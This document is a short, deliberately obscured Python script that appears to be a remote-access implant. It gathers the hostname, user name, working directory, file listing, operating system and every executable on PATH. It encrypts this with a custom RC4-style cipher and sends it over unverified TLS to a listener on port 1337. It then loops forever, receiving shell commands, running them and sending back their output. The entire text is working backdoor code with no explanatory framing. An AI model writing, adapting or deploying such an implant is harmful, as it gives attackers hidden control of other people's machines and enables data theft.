from json import dumps;from platform import node as h,system as S;from socket import socket as b;from os.path import exists as w;from getpass import getuser as i;from sys import argv,stderr,exit;from contextlib import suppress as q;from subprocess import run,PIPE as z;from ssl import _create_unverified_context as u;from os import getcwd as j,environ as n,listdir as l,name,urandom as y;x=True;k=argv[1].encode();f=b"POST / HTTP/1.0\r\nContent-Type: {type}\r\nHost: 127.0.0.1\r\nContent-Length: {length}\r\n\r\n";c=u()
def e(p,d=False):
	if d:v=p[:256];p=p[256:]
	else:v=y(256)
	j,S,o=0,list(range(256)),[]
	for i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]
	S = [v[i]^c for i,c in enumerate(S)];i=j=0
	for c in p:i=(i+1)%256;j=(j+S[i])%256;S[i],S[j]=S[j],S[i];o.append(c^S[(S[i]+S[j])%256])
	if d:return bytes(o)
	return v+bytes(o)
def g():return [f for d in n["PATH"].split(":" if name != "nt" else ";") if w(d) for f in l(d)]
def a(d):
	c,d=d[:30000],d[30000:]
	while c:s.sendall(c);c=d[:30000];d=d[30000:]
while x:
	with q(Exception):
		r=b""
		while r!=b"\6":
			s=b();s.connect(("127.0.0.1",1337));d=e(b"\1"+dumps({"hostname":h(),"user":i(),"cwd":j(),"executables":g(),"files":l(),"system":S()}).encode());s=c.wrap_socket(s);a(f.replace(b"{type}",b"application/json; charset=utf-8").replace(b"{length}",str(len(d)).encode("latin-1"))+d);r=e(s.recv(65535).split(b"\r\n\r\n",1)[1],x);s.close()
		d=b" "
		while x:
			s=b();s.connect(("127.0.0.1", 1337));s=c.wrap_socket(s);a(f.replace(b"{type}",b"text/plain; charset=utf-8").replace(b"{length}",str(len(d)).encode("latin-1"))+e(d));m=e(s.recv(65535).split(b"\r\n\r\n",1)[1],x).decode();p=run(m,shell=x,stdout=z,stderr=z);d=p.stdout+p.stderr or b" ";s.close()